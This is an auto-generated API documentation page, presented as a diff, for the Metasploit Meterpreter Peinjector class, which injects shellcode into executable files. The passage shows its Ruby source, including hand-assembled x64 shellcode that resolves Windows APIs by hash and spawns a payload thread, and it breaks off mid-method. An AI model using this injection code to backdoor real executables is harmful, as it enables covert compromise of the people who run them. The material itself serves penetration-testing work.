@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Class: Rex::Post::Meterpreter::Extensions::Peinjector::Peinjector
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Rex::Post::Meterpreter::Extensions::Peinjector::Peinjector";
+  relpath = '../../../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../../../_index.html">Index (P)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../../../Rex.html" title="Rex (module)">Rex</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../../Post.html" title="Rex::Post (module)">Post</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../Meterpreter.html" title="Rex::Post::Meterpreter (module)">Meterpreter</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Extensions.html" title="Rex::Post::Meterpreter::Extensions (module)">Extensions</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Peinjector.html" title="Rex::Post::Meterpreter::Extensions::Peinjector (module)">Peinjector</a></span></span>
+     &raquo; 
+    <span class="title">Peinjector</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Class: Rex::Post::Meterpreter::Extensions::Peinjector::Peinjector
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+  <dl>
+    <dt>Inherits:</dt>
+    <dd>
+      <span class="inheritName"><span class='object_link'><a href="../../Extension.html" title="Rex::Post::Meterpreter::Extension (class)">Rex::Post::Meterpreter::Extension</a></span></span>
+      
+        <ul class="fullTree">
+          <li>Object</li>
+          
+            <li class="next"><span class='object_link'><a href="../../Extension.html" title="Rex::Post::Meterpreter::Extension (class)">Rex::Post::Meterpreter::Extension</a></span></li>
+          
+            <li class="next">Rex::Post::Meterpreter::Extensions::Peinjector::Peinjector</li>
+          
+        </ul>
+        <a href="#" class="inheritanceTree">show all</a>
+      
+    </dd>
+  </dl>
+  
+
+  
+  
+  
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/rex/post/meterpreter/extensions/peinjector/peinjector.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>This meterpreter extensions allow to inject a given shellcode into an executable file.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+
+
+
+  <h2>Instance Attribute Summary</h2>
+  
+  <h3 class="inherited">Attributes inherited from <span class='object_link'><a href="../../Extension.html" title="Rex::Post::Meterpreter::Extension (class)">Rex::Post::Meterpreter::Extension</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../Extension.html#client-instance_method" title="Rex::Post::Meterpreter::Extension#client (method)">#client</a></span>, <span class='object_link'><a href="../../Extension.html#name-instance_method" title="Rex::Post::Meterpreter::Extension#name (method)">#name</a></span></p>
+
+
+  
+    <h2>
+      Class Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#extension_id-class_method" title="extension_id (class method)">.<strong>extension_id</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#add_thread_x64-instance_method" title="#add_thread_x64 (instance method)">#<strong>add_thread_x64</strong>(payload)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#add_thread_x86-instance_method" title="#add_thread_x86 (instance method)">#<strong>add_thread_x86</strong>(payload)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(client)  &#x21d2; Peinjector </a>
+    
+
+    
+  </span>
+  
+  
+    <span class="note title constructor">constructor</span>
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>A new instance of Peinjector.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#inject_shellcode-instance_method" title="#inject_shellcode (instance method)">#<strong>inject_shellcode</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  <div id="constructor_details" class="method_details_list">
+  <h2>Constructor Details</h2>
+  
+    <div class="method_details first">
+  <h3 class="signature first" id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(client)  &#x21d2; <tt><span class='object_link'><a href="" title="Rex::Post::Meterpreter::Extensions::Peinjector::Peinjector (class)">Peinjector</a></span></tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns a new instance of Peinjector.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/rex/post/meterpreter/extensions/peinjector/peinjector.rb', line 22</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_client'>client</span><span class='rparen'>)</span>
+  <span class='kw'>super</span><span class='lparen'>(</span><span class='id identifier rubyid_client'>client</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>peinjector</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_client'>client</span><span class='period'>.</span><span class='id identifier rubyid_register_extension_aliases'>register_extension_aliases</span><span class='lparen'>(</span>
+    <span class='lbracket'>[</span>
+      <span class='lbrace'>{</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>name</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>peinjector</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ext</span><span class='tstring_end'>&#39;</span></span>  <span class='op'>=&gt;</span> <span class='kw'>self</span>
+      <span class='rbrace'>}</span>
+    <span class='rbracket'>]</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+  
+</div>
+
+
+  <div id="class_method_details" class="method_details_list">
+    <h2>Class Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="extension_id-class_method">
+  
+    .<strong>extension_id</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+18
+19
+20</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/rex/post/meterpreter/extensions/peinjector/peinjector.rb', line 18</span>
+
+<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_extension_id'>extension_id</span>
+  <span class='const'><span class='object_link'><a href="../Peinjector.html#EXTENSION_ID_PEINJECTOR-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::EXTENSION_ID_PEINJECTOR (constant)">EXTENSION_ID_PEINJECTOR</a></span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="add_thread_x64-instance_method">
+  
+    #<strong>add_thread_x64</strong>(payload)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/rex/post/meterpreter/extensions/peinjector/peinjector.rb', line 95</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_add_thread_x64'>add_thread_x64</span><span class='lparen'>(</span><span class='id identifier rubyid_payload'>payload</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_stackpreserve'>stackpreserve</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>	<span class='comment'># AUTOMATED ASM: x64 = [&#39;nop&#39;, &#39;push rax&#39;, &#39;push rbx&#39;, &#39;push rcx&#39;, &#39;push rdx&#39;, &#39;push rsi&#39;, &#39;push rdi&#39;, &#39;push rbp&#39;, &#39;push r8&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x64 = [&#39;push r9&#39;, &#39;push r10&#39;, &#39;push r11&#39;, &#39;push r12&#39;, &#39;push r13&#39;, &#39;push r14&#39;, &#39;push r15&#39;, &#39;pushfq&#39;]
+</span>
+  <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE8\xB8\xFF\xFF\xFF</span><span class='tstring_end'>&quot;</span></span>	<span class='comment'># AUTOMATED ASM: x64 = [&#39;call 0xffffffffffffffbd&#39;]
+</span>
+  <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>+=</span> <span class='id identifier rubyid_payload'>payload</span>
+
+  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x90</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                              <span class='comment'># &lt;--THAT&#39;S A NOP. \o/	# AUTOMATED ASM: x64 = [&#39;nop&#39;]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe8\xc0\x00\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>              <span class='comment'># jmp to allocate	# AUTOMATED ASM: x64 = [&#39;call 0xc5&#39;]
+</span>      <span class='comment'># api_call
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x51</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># push r9
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x50</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># push r8
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x52</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                              <span class='comment'># push rdx
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x51</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                              <span class='comment'># push rcx
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x56</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                              <span class='comment'># push rsi
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xD2</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># xor rdx,rdx
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x65\x48\x8B\x52\x60</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>              <span class='comment'># mov rdx,qword ptr gs:[rdx+96]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x8B\x52\x18</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                  <span class='comment'># mov rdx,qword ptr [rdx+24]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x8B\x52\x20</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                  <span class='comment'># mov rdx,qword ptr[rdx+32]
+</span>
+      <span class='comment'># next_mod
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x8b\x72\x50</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                  <span class='comment'># mov rsi,[rdx+80]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x0f\xb7\x4a\x4a</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>              <span class='comment'># movzx rcx,word [rdx+74]
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4d\x31\xc9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># xor r9,r9
+</span>
+      <span class='comment'># loop_modname
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xc0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># xor rax,rax
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xac</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                              <span class='comment'># lodsb
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3c\x61</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># cmp al, 61h (a)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x02</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># jl 02h
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x2c\x20</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># sub al, 0x20
+</span>
+      <span class='comment'># not_lowercase
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\xc1\xc9\x0d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                  <span class='comment'># ror r9d, 13
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x01\xc1</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># add r9d, eax
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe2\xed</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># loop until read, back to xor rax, rax
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x52</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                              <span class='comment'># push rdx ;Save the current position in the module list
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x51</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># push r9 ; Save the current module hash for later
+</span>      <span class='comment'># ; Proceed to iterate the export address table,
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x8b\x52\x20</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                  <span class='comment'># mov rdx, [rdx+32] ; Get this modules base address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x42\x3c</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># mov eax, dword [rdx+60] ; Get PE header
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x01\xd0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># add rax, rdx ; Add the modules base address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x80\x88\x00\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>          <span class='comment'># mov eax, dword [rax+136] ; Get export tables RVA
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x85\xc0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># test rax, rax ; Test if no export address table
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x74\x67</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># je get_next_mod1 ; If no EAT present, process the nex
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x01\xd0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># add rax, rdx ; Add the modules base address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x50</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                              <span class='comment'># push rax ; Save the current modules EAT
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x48\x18</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># mov ecx, dword [rax+24] ; Get the number of function
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\x8b\x40\x20</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                  <span class='comment'># mov r8d, dword [rax+32] ; Get the rva of the function
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x49\x01\xd0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># add r8, rdx ; Add the modules base address
+</span>
+      <span class='comment'># get_next_func: ;
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe3\x56</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                          <span class='comment'># jrcxz get_next_mod; When we reach the start of the EAT
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\xff\xc9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># dec rcx ; Decrement the function name counter
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x8b\x34\x88</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                  <span class='comment'># mov esi, dword [r8+rcx*4]; Get rva of next module name
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x01\xd6</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># add rsi, rdx ; Add the modules base address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4d\x31\xc9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                      <span class='comment'># xor r9, r9 ; Clear r9 which will store the hash
+</span>      <span class='comment'>#  ; And compare it to the one we wan
+</span>      <span class='comment'># loop_funcname: ;
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xc0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># xor rax, rax ; Clear rax
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xac</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># lodsb ; Read in the next byte of the ASCII funct name
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\xc1\xc9\x0d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                 <span class='comment'># ror r9d, 13 ; Rotate right our hash value
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x01\xc1</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># add r9d, eax ; Add the next byte of the name
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\xe0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># cmp al, ah ; Compare AL to AH (null)
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x75\xf1</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># jne loop_funcname ; continue
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4c\x03\x4c\x24\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>             <span class='comment'># add r9, [rsp+8] ; Add the current module hash
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x39\xd1</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># cmp r9d, r10d ; Compare the hash
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x75\xd8</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># jnz get_next_func ; Go compute the next function hash
+</span>
+      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># pop rax ; Restore the current modules EAT
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\x8b\x40\x24</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                 <span class='comment'># mov r8d, dword [rax+36] ; Get the ordinal table rva
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x49\x01\xd0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># add r8, rdx ; Add the modules base address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x66\x41\x8b\x0c\x48</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>             <span class='comment'># mov cx, [r8+2*rcx] ; Get the desired functions ordinal
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\x8b\x40\x1c</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                 <span class='comment'># mov r8d, dword [rax+28] ; Get the funct addr table rva
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x49\x01\xd0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># add r8, rdx ; Add the modules base address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x8b\x04\x88</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                 <span class='comment'># mov eax, dword [r8+4*rcx]; Get the desired func RVA
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x01\xd0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># add rax, rdx ; Add the modules base address
+</span>
+      <span class='comment'># finish:
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r8 ; Clear off the current modules hash
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r8 ;Clear off the curr position in the module list
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5E</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># pop rsi ; Restore RSI
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x59</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># pop rcx ; Restore the 1st parameter
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5A</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># pop rdx ; Restore the 2nd parameter
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r8 ; Restore the 3rd parameter
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x59</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r9 ; Restore the 4th parameter
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x5A</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r10 ; pop off the return address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x83\xEC\x20</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                 <span class='comment'># sub rsp, 32 ; reserve space for the register params
+</span>
+      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x52</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># push r10 ; push back the return address
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFF\xE0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># jmp rax ; Jump into the required function
+</span>
+      <span class='comment'># get_next_mod: ;
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># pop rax ; Pop off the current modules EAT
+</span>
+      <span class='comment'># get_next_mod1: ;
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\x59</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                         <span class='comment'># pop r9 ; Pop off the current modules hash
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5A</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                             <span class='comment'># pop rdx ; Restore our position in the module list
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x8B\x12</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                     <span class='comment'># mov rdx, [rdx] ; Get the next module
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe9\x57\xff\xff\xff</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'># jmp next_mod ; Process this module
+</span>
+  <span class='comment'># allocate
+</span>  <span class='id identifier rubyid_thread'>thread</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>                       <span class='comment'># pop rbp
+</span>      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x49\xc7\xc6</span><span class='tstring_end'>&quot;</span></span>                       <span class='comment'># mov r14, 1abh size of payload...	# AUTOMATED ASM: x64 = [&#39;invalid&#39;]
+</span>
